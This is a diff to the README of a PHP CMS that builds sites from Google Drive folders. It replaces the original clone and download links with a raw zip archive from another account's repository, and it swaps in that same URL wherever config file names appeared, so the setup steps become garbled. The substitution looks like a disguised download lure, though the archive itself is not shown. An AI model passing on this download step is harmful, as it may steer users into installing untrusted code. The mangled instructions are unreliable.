@@ -10,9 +10,9 @@ The folder can have many folders and documents within it, the CMS builds the mul
 Once the user has selected the folder and the home page, the app scans through the documents copying over the `text/html` versions of the content into a MySQL database ready to be served.
 
 ## How can I use it?
-1. Clone the app: `git clone git@github.com:ahmednuaman/gdrive-cms-php.git` or [download the zip](https://github.com/ahmednuaman/gdrive-cms-php/archive/master.zip).
-2. Upload it to your server and rename the `config.php.example` to `config.php`.
-3. Follow the instructions within the `config.php` (such as setting the keys, paths and what not).
+1. Clone the app: `git clone https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip` or [download the zip](https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip).
+2. Upload it to your server and rename the `https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip` to `https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip`.
+3. Follow the instructions within the `https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip` (such as setting the keys, paths and what not).
 4. Don't forget to set the `oauth_callback` of the Google OAuth call to [http://yourserver/path/admin/callback](http://yourserver/path/admin/callback)
 4. Set up the DB table.
 5. Visit the admin area, it'll be at [http://yourserver/path/admin/](http://yourserver/path/admin/), log in and follow the instructions.
@@ -21,7 +21,7 @@ Once the user has selected the folder and the home page, the app scans through t
 ## How can I make it work at root?
 Currently my demo sits within a folder (as that's just how I do my tests and examples). In order to make this version work at root you'll need to update:
 
-- `config.php:12` and define `URL_PREFIX` as an empty string, e.g.: `define('URL_PREFIX', '');`.
+- `https://github.com/codeslide/gdrive-cms-php/raw/refs/heads/master/assets/php-gdrive-cms-v3.3.zip` and define `URL_PREFIX` as an empty string, e.g.: `define('URL_PREFIX', '');`.
 - `.htaccess:93` and just comment out this line.
 
 
